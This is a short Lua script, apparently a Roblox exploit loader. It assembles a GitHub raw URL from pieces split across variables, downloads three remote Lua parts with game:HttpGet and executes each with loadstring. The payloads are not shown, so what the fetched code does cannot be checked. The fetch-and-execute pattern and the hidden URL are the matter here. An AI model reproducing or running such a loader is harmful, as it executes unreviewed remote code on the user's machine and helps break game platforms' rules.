local AstroTheBestDud = "htt"
local DandyCantMakeThis = "ps://"
local BoxtenAndCosmoForever = "raw.githubusercontent.com"
local PebblesIsCute = "/Midnight-Star-blip/Astro-s-Dreamworld/refs/heads/main/"
local GoobLovesYou = "AstroPart"

local function AstroSecretFunction(part)
    local TishaLovesSprout = AstroTheBestDud .. DandyCantMakeThis .. BoxtenAndCosmoForever .. PebblesIsCute .. GoobLovesYou .. part .. ".lua"
    print("Intentando cargar: " .. TishaLovesSprout)  
    return game:HttpGet(TishaLovesSprout)
end

local function GoobIsBest(part)
    local success, code = pcall(AstroSecretFunction, part)
    if success and code and #code > 500 then
        loadstring(code)()
        return true
    end
    return false
end

for i = 1, 3 do
    print("Loading :D " .. i)
    if GoobIsBest(tostring(i)) then
        print("✅  " .. i .. " Loaded yay!")
    else
        warn("❌ Error " .. i)
    end
    task.wait(0.5)
end

print("Astro the best dud :> Proceso terminado")
